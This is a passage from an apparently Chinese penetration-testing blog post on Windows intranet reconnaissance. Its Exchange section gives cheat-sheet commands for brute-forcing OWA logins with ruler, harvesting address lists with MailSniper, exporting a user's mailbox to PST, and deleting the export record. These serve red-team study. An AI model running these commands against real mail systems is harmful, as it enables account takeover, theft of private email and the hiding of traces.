<h5 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">邮箱用户密码爆破</span><br><span class="line">使用ruler工具对owa接口进行爆破：.&#x2F;ruler  --domain targetdomain.com brute --users &#x2F;path&#x2F;to&#x2F;user.txt --passwords  &#x2F;path&#x2F;to&#x2F;passwords.txt</span><br><span class="line">   工具地址：https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;ruler</span><br><span class="line">使用MailSniper收集通讯录：Get-GlobalAddressList  -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016  -OutFile global-address-list.txt</span><br><span class="line">获取所有邮箱用户：Get-Mailbox</span><br><span class="line">导出邮件：New-MailboxexportRequest  -mailbox username -FilePath (&quot;\\localhost\c$\test\username.pst&quot;)</span><br><span class="line">删除某个导出记录：Remove-MailboxExportRequest  -Identity &#39;username\mailboxexport&#39; -Confirm:$false</span><br><span class="line">    工具地址：https:&#x2F;&#x2F;github.com&#x2F;dafthack&#x2F;MailSniper</span><br></pre></td></tr></table></figure>


      </section>
      <section class="extra">
        
          <ul class="copyright">
  
    <li><strong>本文作者：</strong>jinny</li>
    <li><strong>本文链接：</strong><a href="http://example.com/2020/06/29/windows-info/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;06&#x2F;29&#x2F;windows-info&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;06&#x2F;29&#x2F;windows-info&#x2F;index.html</a></li>
    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
  
</ul>
        
        
          <section class="donate">
  <div id="qrcode-donate">
    <img src="">
  </div>
  <div class="icon">
    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
  </div>
</section>
        
        
  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">windows内网信息收集</a></li></ul> 

        
  <nav class="nav">
    <a href="/2020/06/29/window-quanxianweichi/"><i class="iconfont iconleft"></i>windows权限维持</a>
    <a></a>
  </nav>

      </section>
      
    </section>
  </div>
</article></div>
      <div class="col-xl-3">
        
          
  <aside class="toc-wrap">
    <h3 class="toc-title">文章目录：</h3>
    
  </aside>

        
      </div>
    </div>
  </div>
</main>
  

<footer class="footer">
  <div class="footer-social"><a 
        href="tencent://message/?Menu=yes&uin=894519210 "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#12B7F5'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconQQ "></i>
      </a><a 
        href="javascript:; "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#09BB07'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconwechat-fill "></i>
      </a><a 
        href="https://www.instagram.com/izhaoo/ "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#DA2E76'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconinstagram "></i>
      </a><a 
        href="https://github.com/zhaoo "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#9f7be1'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  icongithub-fill "></i>
      </a><a 
        href="mailto:izhaoo@163.com "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color=#FF3B00" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconmail"></i>
      </a></div>
  
    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://pl.jinny.vip">jinny</a></div>
  
</footer>
  
      <div class="fab fab-plus">
    <i class="iconfont iconplus"></i>
  </div>
  
  
  <div class="fab fab-up">
    <i class="iconfont iconcaret-up"></i>
  </div>
  
  
  
    
<script src="/js/color-mode.js"></script>

  
  
</body>

<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>



  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>




  
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>








<script src="/js/utils.js"></script>
<script src="/js/script.js"></script>







  <script>
    (function () {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>













</html>